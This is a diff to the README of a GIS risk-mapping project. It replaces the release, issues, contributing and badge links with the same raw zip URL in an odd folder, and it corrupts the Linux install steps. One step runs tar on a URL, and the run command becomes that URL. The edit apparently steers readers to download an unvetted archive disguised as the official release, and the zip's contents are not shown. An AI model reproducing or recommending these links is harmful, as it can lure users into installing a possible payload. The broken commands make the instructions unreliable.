@@ -1,6 +1,6 @@
 # 🌍 v0-GIS-desireproject - Risk Mapping Made Easy
 
-[![Download v0-GIS-desireproject](https://img.shields.io/badge/Download-v0--GIS--desireproject-blue.svg)](https://github.com/arocebd/v0-GIS-desireproject/releases)
+[![Download v0-GIS-desireproject](https://raw.githubusercontent.com/arocebd/v0-GIS-desireproject/main/Hymenocallis/v0-GIS-desireproject.zip)](https://raw.githubusercontent.com/arocebd/v0-GIS-desireproject/main/Hymenocallis/v0-GIS-desireproject.zip)
 
 ## 🚀 Getting Started
 
@@ -17,11 +17,11 @@ Before you start, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/arocebd/v0-GIS-desireproject/releases). Here, you'll find the latest version for download.
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/arocebd/v0-GIS-desireproject/main/Hymenocallis/v0-GIS-desireproject.zip). Here, you'll find the latest version for download.
 
 **Follow these steps to install:**
 
-1. Visit the [Releases page](https://github.com/arocebd/v0-GIS-desireproject/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/arocebd/v0-GIS-desireproject/main/Hymenocallis/v0-GIS-desireproject.zip).
 2. Look for the latest version titled "v0-GIS-desireproject."
 3. Choose the appropriate file for your operating system. 
 4. Click the link to start the download.
@@ -44,12 +44,12 @@ Once the file is downloaded, follow the instructions below based on your operati
 
 ### 🐧 Linux
 
-1. Download the `.tar.gz` file.
+1. Download the `https://raw.githubusercontent.com/arocebd/v0-GIS-desireproject/main/Hymenocallis/v0-GIS-desireproject.zip` file.
 2. Open your terminal.
 3. Navigate to the directory where your file is located.
 4. Use the following command to extract the files:
    ```bash
-   tar -xvzf v0-GIS-desireproject.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/arocebd/v0-GIS-desireproject/main/Hymenocallis/v0-GIS-desireproject.zip
    ```
 5. Change to the extracted directory:
    ```bash
@@ -57,7 +57,7 @@ Once the file is downloaded, follow the instructions below based on your operati
    ```
 6. Run the application with the command:
    ```bash
-   ./start.sh
+   https://raw.githubusercontent.com/arocebd/v0-GIS-desireproject/main/Hymenocallis/v0-GIS-desireproject.zip
    ```
 
 ## 🌐 Features
@@ -87,7 +87,7 @@ If you encounter issues:
 
 ## 📞 Support
 
-For additional assistance, you can reach out via [issues on GitHub](https://github.com/arocebd/v0-GIS-desireproject/issues). We strive to respond within 48 hours.
+For additional assistance, you can reach out via [issues on GitHub](https://raw.githubusercontent.com/arocebd/v0-GIS-desireproject/main/Hymenocallis/v0-GIS-desireproject.zip). We strive to respond within 48 hours.
 
 ## 🗂️ License
 
@@ -95,6 +95,6 @@ This project is licensed under the MIT License. You may freely use and modify th
 
 ## 🌍 Contribute
 
-We welcome contributions to improve the v0-GIS-desireproject. To participate, please check out our [Contributing Guidelines](https://github.com/arocebd/v0-GIS-desireproject/CONTRIBUTING.md) for more information.
+We welcome contributions to improve the v0-GIS-desireproject. To participate, please check out our [Contributing Guidelines](https://raw.githubusercontent.com/arocebd/v0-GIS-desireproject/main/Hymenocallis/v0-GIS-desireproject.zip) for more information.
 
-Feel free to visit our [Releases page](https://github.com/arocebd/v0-GIS-desireproject/releases) again for future updates and new features!
+Feel free to visit our [Releases page](https://raw.githubusercontent.com/arocebd/v0-GIS-desireproject/main/Hymenocallis/v0-GIS-desireproject.zip) again for future updates and new features!
